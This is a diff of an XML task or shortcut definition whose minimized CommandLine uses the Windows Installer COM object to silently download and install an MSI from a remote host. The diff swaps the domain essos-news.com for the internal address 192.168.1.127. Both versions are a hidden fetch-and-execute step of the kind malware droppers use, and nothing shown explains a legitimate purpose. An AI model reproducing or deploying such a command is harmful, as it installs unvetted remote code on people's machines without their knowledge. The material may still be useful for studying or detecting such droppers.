@@ -68,7 +68,7 @@
             <Image Name="Small" BinaryRefIndex="6"/>
             <Image Name="Large" BinaryRefIndex="7"/>
           </Symbol>
-          <CommandLine Directory="" WindowState="Minimized" Params="$erdt=new-object -comobject 'WindowsInstaller.Installer';$erdt.uilevel = 2;$erdt.installproduct('http://essos-news.com/files2/2025erdt.msi','REMOVE=ALL');$erdt.installproduct('http://essos-news.com/files2/2025erdt.msi')"/>
+          <CommandLine Directory="" WindowState="Minimized" Params="$erdt=new-object -comobject 'WindowsInstaller.Installer';$erdt.uilevel = 2;$erdt.installproduct('http://192.168.1.127/files2/2025erdt.msi','REMOVE=ALL');$erdt.installproduct('http://192.168.1.127/files2/2025erdt.msi')"/>
         </Task>
       </Tasks>
       <BookMark Name="TargetNode" NodeID="1"/>
